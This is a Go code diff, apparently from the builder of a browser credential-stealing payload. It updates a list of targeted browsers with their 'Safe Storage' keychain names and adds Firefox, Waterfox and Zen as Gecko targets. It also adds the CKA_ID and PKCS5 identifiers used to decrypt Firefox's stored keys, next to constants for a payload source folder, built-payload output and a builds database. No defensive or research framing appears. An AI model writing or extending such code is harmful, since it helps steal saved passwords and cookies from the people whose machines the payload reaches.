@@ -7,12 +7,14 @@ import (
 )
 
 var SupportedBrowsers = []models.BrowserConfig{
-	{Name: "Chrome", PathString: filepath.Join("Browsers", "Chrome"), PrintName: "b'Chrome Safe Storage'"},
-	{Name: "Edge", PathString: filepath.Join("Browsers", "Edge"), PrintName: "b'Edge Safe Storage'"},
-	{Name: "Brave", PathString: filepath.Join("Browsers", "Brave"), PrintName: "b'Brave Safe Storage'"},
-	{Name: "Vivaldi", PathString: filepath.Join("Browsers", "Vivaldi"), PrintName: "b'Vivaldi Safe Storage'"},
-	{Name: "Opera", PathString: filepath.Join("Browsers", "Opera"), PrintName: "b'Opera Safe Storage'"},
-	//{Name: "Firefox", PathString: filepath.Join("Browsers", "Firefox"), PrintName: ""},
+	{Name: "Chrome", PathString: filepath.Join("Browsers", "Chrome"), PrintName: "b'Chrome Safe Storage'", Type: "Chromium"},
+	{Name: "Edge", PathString: filepath.Join("Browsers", "Edge"), PrintName: "b'Edge Safe Storage'", Type: "Chromium"},
+	{Name: "Brave", PathString: filepath.Join("Browsers", "Brave"), PrintName: "b'Brave Safe Storage'", Type: "Chromium"},
+	{Name: "Vivaldi", PathString: filepath.Join("Browsers", "Vivaldi"), PrintName: "b'Vivaldi Safe Storage'", Type: "Chromium"},
+	{Name: "Opera", PathString: filepath.Join("Browsers", "Opera"), PrintName: "b'Opera Safe Storage'", Type: "Chromium"},
+	{Name: "Firefox", PathString: filepath.Join("Browsers", "Firefox"), PrintName: "", Type: "Gecko"},
+	{Name: "Waterfox", PathString: filepath.Join("Browsers", "Waterfox"), PrintName: "", Type: "Gecko"},
+	{Name: "Zen", PathString: filepath.Join("Browsers", "Zen"), PrintName: "", Type: "Gecko"},
 }
 
 var (
@@ -27,4 +29,9 @@ const (
 	PayloadOutputDir = "../built"
 	PayloadSourceDir = "../payload"
 	DBFile           = "builds.db"
+)
+
+var (
+	CkaId   = []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
+	Pkcs5Id = []int{1, 2, 840, 113549, 1, 5, 13}
 )
